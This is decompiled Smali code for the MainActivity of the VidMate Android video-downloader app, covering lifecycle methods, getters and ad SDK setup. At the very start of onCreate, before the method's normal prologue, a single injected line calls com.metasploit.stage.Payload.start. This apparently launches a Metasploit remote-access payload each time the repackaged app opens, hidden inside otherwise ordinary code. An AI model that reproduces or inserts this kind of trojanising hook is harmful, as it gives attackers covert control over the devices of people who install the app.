.method public f()Lcom/nemo/vidmate/home/aj;
    .locals 1

    .prologue
    .line 457
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->n:Lcom/nemo/vidmate/home/aj;

    if-nez v0, :cond_0

    .line 458
    new-instance v0, Lcom/nemo/vidmate/home/aj;

    invoke-direct {v0, p0}, Lcom/nemo/vidmate/home/aj;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/nemo/vidmate/MainActivity;->n:Lcom/nemo/vidmate/home/aj;

    .line 459
    :cond_0
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->n:Lcom/nemo/vidmate/home/aj;

    return-object v0
.end method

.method public g()Lcom/nemo/vidmate/download/a/ai;
    .locals 1

    .prologue
    .line 475
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->o:Lcom/nemo/vidmate/download/a/ai;

    if-nez v0, :cond_0

    .line 476
    new-instance v0, Lcom/nemo/vidmate/download/a/ai;

    invoke-direct {v0, p0}, Lcom/nemo/vidmate/download/a/ai;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/nemo/vidmate/MainActivity;->o:Lcom/nemo/vidmate/download/a/ai;

    .line 477
    :cond_0
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->o:Lcom/nemo/vidmate/download/a/ai;

    return-object v0
.end method

.method public h()Lcom/nemo/vidmate/l/y;
    .locals 1

    .prologue
    .line 481
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->q:Lcom/nemo/vidmate/l/y;

    if-nez v0, :cond_0

    .line 482
    new-instance v0, Lcom/nemo/vidmate/l/y;

    invoke-direct {v0, p0}, Lcom/nemo/vidmate/l/y;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/nemo/vidmate/MainActivity;->q:Lcom/nemo/vidmate/l/y;

    .line 483
    :cond_0
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->q:Lcom/nemo/vidmate/l/y;

    return-object v0
.end method

.method public i()Lcom/nemo/vidmate/d/e;
    .locals 1

    .prologue
    .line 494
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->t:Lcom/nemo/vidmate/d/e;

    if-nez v0, :cond_0

    .line 495
    new-instance v0, Lcom/nemo/vidmate/d/e;

    invoke-direct {v0, p0}, Lcom/nemo/vidmate/d/e;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/nemo/vidmate/MainActivity;->t:Lcom/nemo/vidmate/d/e;

    .line 496
    :cond_0
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->t:Lcom/nemo/vidmate/d/e;

    return-object v0
.end method

.method public j()Lcom/nostra13/universalimageloader/core/ImageLoader;
    .locals 1

    .prologue
    .line 513
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->s:Lcom/nostra13/universalimageloader/core/ImageLoader;

    if-nez v0, :cond_0

    .line 514
    invoke-static {}, Lcom/nostra13/universalimageloader/core/ImageLoader;->getInstance()Lcom/nostra13/universalimageloader/core/ImageLoader;

    move-result-object v0

    iput-object v0, p0, Lcom/nemo/vidmate/MainActivity;->s:Lcom/nostra13/universalimageloader/core/ImageLoader;

    .line 515
    :cond_0
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->s:Lcom/nostra13/universalimageloader/core/ImageLoader;

    return-object v0
.end method

.method public k()Z
    .locals 1

    .prologue
    .line 739
    const/4 v0, 0x0

    return v0
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 4

    .prologue
    const/4 v2, -0x1

    .line 640
    invoke-super {p0, p1, p2, p3}, Lcom/nemo/vidmate/BaseMainActivity;->onActivityResult(IILandroid/content/Intent;)V

    .line 641
    const/4 v0, 0x1

    if-ne p1, v0, :cond_1

    if-ne p2, v2, :cond_1

    if-eqz p3, :cond_1

    .line 642
    const-string v0, "type"

    const/4 v1, 0x0

    invoke-virtual {p3, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    .line 643
    if-ne v0, v2, :cond_1

    .line 646
    invoke-static {p0}, Lcom/nemo/vidmate/player/a/a;->b(Landroid/app/Activity;)V

    .line 675
    :cond_0
    :goto_0
    return-void

    .line 651
    :cond_1
    if-ne p2, v2, :cond_0

    .line 652
    packed-switch p1, :pswitch_data_0

    goto :goto_0

    .line 668
    :pswitch_0
    invoke-static {}, Lcom/nemo/vidmate/utils/bo;->b()Ljava/io/File;

    move-result-object v0

    .line 669
    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/io/File;->isFile()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 670
    invoke-static {v0}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/nemo/vidmate/utils/bo;->a(Landroid/app/Activity;Landroid/net/Uri;)V

    goto :goto_0

    .line 654
    :pswitch_1
    if-eqz p3, :cond_0

    invoke-virtual {p3}, Landroid/content/Intent;->getData()Landroid/net/Uri;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 655
    invoke-virtual {p3}, Landroid/content/Intent;->getData()Landroid/net/Uri;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/nemo/vidmate/utils/bo;->a(Landroid/app/Activity;Landroid/net/Uri;)V

    goto :goto_0

    .line 659
    :pswitch_2
    invoke-static {}, Lcom/nemo/vidmate/utils/bo;->b()Ljava/io/File;

    move-result-object v0

    .line 660
    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/io/File;->isFile()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 661
    const-string v1, "uc_id"

    invoke-static {v1}, Lcom/nemo/vidmate/utils/bv;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 662
    const-string v2, "uc_type"

    invoke-static {v2}, Lcom/nemo/vidmate/utils/bv;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 663
    const-string v3, "uc_sex"

    invoke-static {v3}, Lcom/nemo/vidmate/utils/bv;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 664
    invoke-static {p0, v1, v2, v3, v0}, Lcom/nemo/vidmate/n/y;->a(Landroid/app/Activity;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)V

    goto :goto_0

    .line 652
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
    .end packed-switch
.end method

.method public onContextItemSelected(Landroid/view/MenuItem;)Z
    .locals 1

    .prologue
    .line 632
    invoke-static {}, Lcom/nemo/vidmate/n;->e()Lcom/nemo/vidmate/n;

    move-result-object v0

    .line 633
    if-eqz v0, :cond_0

    .line 634
    invoke-virtual {v0, p1}, Lcom/nemo/vidmate/n;->a(Landroid/view/MenuItem;)Z

    move-result v0

    .line 635
    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x1

    goto :goto_0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    .prologue
    .line 90
    invoke-super {p0, p1}, Lcom/nemo/vidmate/BaseMainActivity;->onCreate(Landroid/os/Bundle;)V

    .line 91
    const-string v0, "MainActivity"

    const-string v1, "onCreate"

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 92
    invoke-static {}, Lcom/nemo/vidmate/utils/z;->a()Lcom/nemo/vidmate/utils/z;

    move-result-object v0

    invoke-virtual {v0, p0}, Lcom/nemo/vidmate/utils/z;->a(Landroid/app/Activity;)V

    .line 93
    invoke-static {}, Lcom/nemo/vidmate/WapkaApplication;->a()Lcom/nemo/vidmate/WapkaApplication;

    move-result-object v0

    invoke-virtual {v0, p0}, Lcom/nemo/vidmate/WapkaApplication;->a(Lcom/nemo/vidmate/MainActivity;)V

    .line 94
    invoke-static {p0}, Lcom/nemo/vidmate/utils/aw;->a(Landroid/content/Context;)V

    .line 95
    const v0, 0x7f03006e

    invoke-virtual {p0, v0}, Lcom/nemo/vidmate/MainActivity;->setContentView(I)V

    .line 97
    :try_start_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, p0, Lcom/nemo/vidmate/MainActivity;->u:J

    .line 98
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/4 v1, -0x3

    invoke-virtual {v0, v1}, Landroid/view/Window;->setFormat(I)V

    .line 99
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/nemo/vidmate/c/b;->a(Landroid/content/Context;)V

    .line 101
    invoke-static {}, Lcom/nemo/vidmate/utils/ai;->a()Lcom/nemo/vidmate/utils/ai;

    move-result-object v0

    invoke-static {}, Lcom/nemo/vidmate/WapkaApplication;->a()Lcom/nemo/vidmate/WapkaApplication;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/nemo/vidmate/utils/ai;->a(Lcom/nemo/vidmate/WapkaApplication;)V

    .line 102
    invoke-static {}, Lcom/nostra13/universalimageloader/core/ImageLoader;->getInstance()Lcom/nostra13/universalimageloader/core/ImageLoader;

    move-result-object v0

    invoke-static {p0}, Lcom/nostra13/universalimageloader/core/ImageLoaderConfiguration;->createDefault(Landroid/content/Context;)Lcom/nostra13/universalimageloader/core/ImageLoaderConfiguration;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/nostra13/universalimageloader/core/ImageLoader;->init(Lcom/nostra13/universalimageloader/core/ImageLoaderConfiguration;)V

    .line 107
    new-instance v0, Lcom/nemo/vidmate/utils/j;

    invoke-direct {v0, p0}, Lcom/nemo/vidmate/utils/j;-><init>(Landroid/app/Activity;)V

    .line 108
    invoke-virtual {v0}, Lcom/nemo/vidmate/utils/j;->a()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 114
    :goto_0
    new-instance v0, Lcom/nemo/vidmate/home/aj;

    invoke-direct {v0, p0}, Lcom/nemo/vidmate/home/aj;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/nemo/vidmate/MainActivity;->n:Lcom/nemo/vidmate/home/aj;

    .line 115
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->n:Lcom/nemo/vidmate/home/aj;

    invoke-virtual {v0}, Lcom/nemo/vidmate/home/aj;->l()V

    .line 118
    :try_start_1
    invoke-static {}, Lcom/nemo/vidmate/download/a;->a()Lcom/nemo/vidmate/download/a;

    move-result-object v0

    invoke-virtual {v0, p0}, Lcom/nemo/vidmate/download/a;->a(Landroid/content/Context;)V

    .line 121
    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    .line 122
    const-string v1, "fource"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 123
    invoke-direct {p0, v1}, Lcom/nemo/vidmate/MainActivity;->d(Ljava/lang/String;)V

    .line 124
    const-string v1, "fource"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 126
    invoke-static {p0, v0}, Lcom/nemo/vidmate/utils/cr;->a(Lcom/nemo/vidmate/MainActivity;Landroid/content/Intent;)V

    .line 128
    new-instance v1, Lcom/nemo/vidmate/utils/ck;

    invoke-direct {v1, p0}, Lcom/nemo/vidmate/utils/ck;-><init>(Lcom/nemo/vidmate/MainActivity;)V

    .line 130
    invoke-virtual {v1}, Lcom/nemo/vidmate/utils/ck;->a()V

    .line 131
    invoke-virtual {v1, v0}, Lcom/nemo/vidmate/utils/ck;->a(Landroid/content/Intent;)V

    .line 132
    invoke-virtual {v1, v0}, Lcom/nemo/vidmate/utils/ck;->b(Landroid/content/Intent;)V

    .line 135
    invoke-static {p0, v0}, Lcom/nemo/vidmate/pushmsg/h;->a(Lcom/nemo/vidmate/MainActivity;Landroid/content/Intent;)V

    .line 137
    invoke-direct {p0, v0}, Lcom/nemo/vidmate/MainActivity;->a(Landroid/content/Intent;)V

    .line 139
    invoke-static {p0}, Lcom/nemo/vidmate/utils/cv;->a(Landroid/app/Activity;)V

    .line 148
    invoke-static {}, Lcom/nemo/vidmate/b/d;->a()Lcom/nemo/vidmate/b/d;

    move-result-object v0

    invoke-virtual {v0}, Lcom/nemo/vidmate/b/d;->c()V

    .line 150
    invoke-static {}, Lcom/nemo/vidmate/utils/ac;->a()V

    .line 152
    invoke-static {}, Lcom/nemo/vidmate/favhis/cd;->b()V

    .line 154
    invoke-static {}, Lcom/nemo/vidmate/browser/c;->a()Lcom/nemo/vidmate/browser/c;

    move-result-object v0

    invoke-virtual {v0}, Lcom/nemo/vidmate/browser/c;->b()V

    .line 156
    invoke-static {}, Lcom/nemo/vidmate/a/a;->a()V

    .line 159
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/nemo/vidmate/pushmsg/VidmateService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/nemo/vidmate/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 161
    invoke-static {}, Lcom/nemo/vidmate/gcm/c;->a()Lcom/nemo/vidmate/gcm/c;

    move-result-object v0

    invoke-virtual {v0}, Lcom/nemo/vidmate/gcm/c;->b()V

    .line 163
    invoke-direct {p0}, Lcom/nemo/vidmate/MainActivity;->l()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 170
    :goto_1
    :try_start_2
    invoke-static {}, Lcom/wemob/ads/Sdk;->instance()Lcom/wemob/ads/Sdk;

    move-result-object v0

    const-string v1, "com.nemo.vidmate"

    invoke-virtual {v0, v1}, Lcom/wemob/ads/Sdk;->setAppKey(Ljava/lang/String;)V

    .line 171
    invoke-static {}, Lcom/wemob/ads/Sdk;->instance()Lcom/wemob/ads/Sdk;

    move-result-object v0

    const-string v1, "11015_4400_001"

    invoke-virtual {v0, v1}, Lcom/wemob/ads/Sdk;->setChannelId(Ljava/lang/String;)V

    .line 172
    invoke-static {}, Lcom/wemob/ads/Sdk;->instance()Lcom/wemob/ads/Sdk;

    move-result-object v0

    invoke-virtual {p0}, Lcom/nemo/vidmate/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/wemob/ads/Sdk;->init(Landroid/content/Context;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 176
    :goto_2
    return-void

    .line 109
    :catch_0
    move-exception v0

    .line 110
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_0

    .line 164
    :catch_1
    move-exception v0

    .line 165
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 173
    :catch_2
    move-exception v0

    goto :goto_2
.end method

.method protected onDestroy()V
    .locals 11

    .prologue
    const/4 v10, 0x2

    const/4 v0, 0x1

    const/4 v1, 0x0

    const/4 v9, 0x0

    .line 268
    const-string v2, "MainActivity"

    const-string v3, "onDestroy"

    invoke-static {v2, v3}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 271
    :try_start_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    .line 272
    iget-wide v4, p0, Lcom/nemo/vidmate/MainActivity;->u:J

    sub-long/2addr v2, v4

    .line 273
    invoke-static {}, Lcom/nemo/vidmate/utils/a;->a()Lcom/nemo/vidmate/utils/a;

    move-result-object v4

    const-string v5, "online_time"

    const/4 v6, 0x2

    new-array v6, v6, [Ljava/lang/Object;

    const/4 v7, 0x0

    const-string v8, "online"

    aput-object v8, v6, v7

    const/4 v7, 0x1

    invoke-static {v2, v3}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v6, v7

    invoke-virtual {v4, v5, v6}, Lcom/nemo/vidmate/utils/a;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 274
    invoke-static {}, Lcom/nemo/vidmate/download/a;->a()Lcom/nemo/vidmate/download/a;

    move-result-object v2

    invoke-virtual {v2, p0}, Lcom/nemo/vidmate/download/a;->b(Landroid/content/Context;)V

    .line 281
    invoke-static {p0}, Lcn/sharesdk/framework/ShareSDK;->stopSDK(Landroid/content/Context;)V

    .line 282
    invoke-static {}, Lcom/nostra13/universalimageloader/core/ImageLoader;->getInstance()Lcom/nostra13/universalimageloader/core/ImageLoader;

    move-result-object v2

    invoke-virtual {v2}, Lcom/nostra13/universalimageloader/core/ImageLoader;->destroy()V

    .line 287
    invoke-static {}, Lcom/nemo/vidmate/player/music/i;->a()Lcom/nemo/vidmate/player/music/i;

    move-result-object v2

    invoke-virtual {v2}, Lcom/nemo/vidmate/player/music/i;->d()I

    move-result v2

    if-eq v2, v10, :cond_2

    .line 288
    invoke-static {p0}, Lcom/nemo/vidmate/player/music/i;->d(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 294
    :goto_0
    invoke-super {p0}, Lcom/nemo/vidmate/BaseMainActivity;->onDestroy()V

    .line 295
    sput-object v9, Lcom/nemo/vidmate/b/d;->c:Lcom/nemo/vidmate/b/d;

    .line 296
    sput-object v9, Lcom/nemo/vidmate/browser/aw;->c:Lcom/nemo/vidmate/browser/aw;

    .line 298
    iput-object v9, p0, Lcom/nemo/vidmate/MainActivity;->n:Lcom/nemo/vidmate/home/aj;

    .line 302
    iget-object v2, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    if-eqz v2, :cond_0

    .line 303
    iget-object v2, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    invoke-virtual {v2}, Lcom/nemo/vidmate/browser/b/a;->s()V

    .line 304
    iput-object v9, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    .line 307
    :cond_0
    iput-object v9, p0, Lcom/nemo/vidmate/MainActivity;->q:Lcom/nemo/vidmate/l/y;

    .line 308
    iput-object v9, p0, Lcom/nemo/vidmate/MainActivity;->r:Lcom/nemo/vidmate/zapya/f;

    .line 309
    iput-object v9, p0, Lcom/nemo/vidmate/MainActivity;->s:Lcom/nostra13/universalimageloader/core/ImageLoader;

    .line 310
    invoke-static {}, Lcom/nemo/vidmate/n;->a()V

    .line 311
    invoke-static {}, Ljava/lang/System;->gc()V

    .line 313
    if-eqz v0, :cond_1

    .line 314
    invoke-static {v1}, Ljava/lang/System;->exit(I)V

    .line 315
    :cond_1
    return-void

    .line 291
    :catch_0
    move-exception v0

    .line 292
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_2
    move v0, v1

    goto :goto_0
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 2

    .prologue
    const/4 v0, 0x1

    .line 609
    const/4 v1, 0x4

    if-ne p1, v1, :cond_1

    invoke-virtual {p2}, Landroid/view/KeyEvent;->getRepeatCount()I

    move-result v1

    if-nez v1, :cond_1

    .line 610
    invoke-static {}, Lcom/nemo/vidmate/n;->e()Lcom/nemo/vidmate/n;

    move-result-object v1

    if-eqz v1, :cond_0

    .line 611
    invoke-static {}, Lcom/nemo/vidmate/n;->e()Lcom/nemo/vidmate/n;

    move-result-object v1

    invoke-virtual {v1}, Lcom/nemo/vidmate/n;->d()V

    .line 627
    :cond_0
    :goto_0
    return v0

    .line 616
    :cond_1
    const/16 v1, 0x52

    if-eq p1, v1, :cond_0

    .line 627
    invoke-super {p0, p1, p2}, Lcom/nemo/vidmate/BaseMainActivity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v0

    goto :goto_0
.end method

.method protected onNewIntent(Landroid/content/Intent;)V
    .locals 1

    .prologue
    .line 200
    if-eqz p1, :cond_0

    .line 201
    const-string v0, "fource"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 202
    invoke-direct {p0, v0}, Lcom/nemo/vidmate/MainActivity;->d(Ljava/lang/String;)V

    .line 203
    invoke-static {p0, p1}, Lcom/nemo/vidmate/utils/cr;->a(Lcom/nemo/vidmate/MainActivity;Landroid/content/Intent;)V

    .line 205
    invoke-static {p0, p1}, Lcom/nemo/vidmate/pushmsg/h;->a(Lcom/nemo/vidmate/MainActivity;Landroid/content/Intent;)V

    .line 206
    invoke-direct {p0, p1}, Lcom/nemo/vidmate/MainActivity;->b(Landroid/content/Intent;)V

    .line 207
    invoke-direct {p0, p1}, Lcom/nemo/vidmate/MainActivity;->a(Landroid/content/Intent;)V

    .line 209
    :cond_0
    return-void
.end method

.method protected onPause()V
    .locals 2

    .prologue
    .line 255
    invoke-super {p0}, Lcom/nemo/vidmate/BaseMainActivity;->onPause()V

    .line 257
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    if-eqz v0, :cond_0

    .line 258
    iget-object v0, p0, Lcom/nemo/vidmate/MainActivity;->p:Lcom/nemo/vidmate/browser/b/a;

    const/4 v1, -0x1

    invoke-virtual {v0, v1}, Lcom/nemo/vidmate/browser/b/a;->b(I)V

    .line 264
    :cond_0
    return-void
.end method

.method protected onResume()V
    .locals 1

    .prologue
    .line 195
    invoke-super {p0}, Lcom/nemo/vidmate/BaseMainActivity;->onResume()V

    .line 196
    invoke-static {}, Lcom/nemo/vidmate/utils/n;->a()Lcom/nemo/vidmate/utils/n;

    move-result-object v0

    invoke-virtual {v0}, Lcom/nemo/vidmate/utils/n;->b()V

    .line 197
    return-void
.end method
